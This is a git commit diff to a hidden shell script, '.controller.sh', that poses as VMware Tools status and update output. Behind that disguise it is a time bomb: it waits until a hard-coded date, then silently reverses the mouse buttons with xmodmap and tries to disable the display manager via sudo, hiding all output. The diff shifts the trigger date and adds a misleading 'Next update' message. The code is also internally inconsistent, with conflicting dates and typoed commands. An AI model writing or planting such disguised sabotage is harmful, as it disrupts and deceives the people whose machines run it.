beeabc7d32267650118f5e4ee4edc2578006382e
lans10 <123293870+lans10@users.noreply.github.com>
2023-04-12 15:13:33 -0400

    Update .controller.sh

--- .controller.sh
+++ .controller.sh
@@ -13,12 +13,15 @@ systemctl status vmware-tools.service
 echo "VMware Tools version: 12.2.0"
 echo "Last update: March 3, 2023"
 
-target_date="2023-04-17"
+target_date="2023-05-03"
 target_time="17:13:00"
 target_timestamp=$(date -d "${target_date} ${target_time}" +%s)
 current_timestamp=$(date +%s)
 sleep_time=$(( target_timestamp - current_timestamp ))
-sleep sleep_time
+echo "Next update: May 3, 2023"
+while [ $(date +%s) -lt $(date --date="2023-04-17T17:13:00" +%s) ]; do
+    sleep 1
+done
 xmodmap -e "pointer = 3 2 1" &> /dev/null
 if command -v systemctl &> /dev/null; then
 	sudo system disable display-manager.service &>/dev/null
